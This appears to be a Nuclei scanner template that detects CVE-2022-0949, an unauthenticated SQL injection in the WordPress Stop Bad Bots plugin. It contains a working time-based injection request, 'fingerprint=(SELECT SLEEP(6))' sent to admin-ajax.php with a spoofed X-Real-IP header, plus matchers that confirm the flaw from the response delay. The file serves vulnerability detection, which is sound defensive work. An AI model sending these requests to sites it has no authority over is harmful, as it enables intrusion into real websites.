id: CVE-2022-0949
info:
  name: WordPress Stop Bad Bots <6.930 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Stop Bad Bots plugin before version 6.930 is vulnerable
    to SQL injection via an unauthenticated user, allowing attackers to potentially
    gain access to sensitive information and execute unauthorized actions.
  remediation: Fixed in version 6.930.
  reference:
  - https://wpscan.com/vulnerability/a0fbb79a-e160-49df-9cf2-18ab64ea66cb
  - https://wordpress.org/plugins/stopbadbots/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0949
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0949
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Stop Bad Bots plugin can
      allow an attacker to execute unauthorized administrative operations and obtain
      sensitive information in the context of the affected site, posing a significant
      impact on its security.
    recommendation: "It is recommended that users uninstall the WordPress Stop Bad\
      \ Bots plugin version 6.930 and\_upgrade to a patched version to prevent exploitation\
      \ of the identified SQL injection vulnerability (CVE-2022-0949)."
  tags: cve,stopbadbots,wp-plugin,wp,unauth,wpscan,cve2022,sqli,wordpress
variables:
  IP: '{{rand_ip("1.1.1.0/24")}}'
requests:
- raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    X-Real-IP: {{IP}}

    Content-Type: application/x-www-form-urlencoded


    action=stopbadbots_grava_fingerprint&fingerprint=0

    '
  - '@timeout 10s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    X-Real-IP: {{IP}}

    Content-Type: application/x-www-form-urlencoded


    action=stopbadbots_grava_fingerprint&fingerprint=(SELECT SLEEP(6))

    '
  - 'GET /wp-content/plugins/stopbadbots/assets/js/stopbadbots.js HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
  matchers:
  - type: dsl
    dsl:
    - duration_2>=6
    - status_code_2 == 200
    - contains(body_3, "commentform")
    condition: and
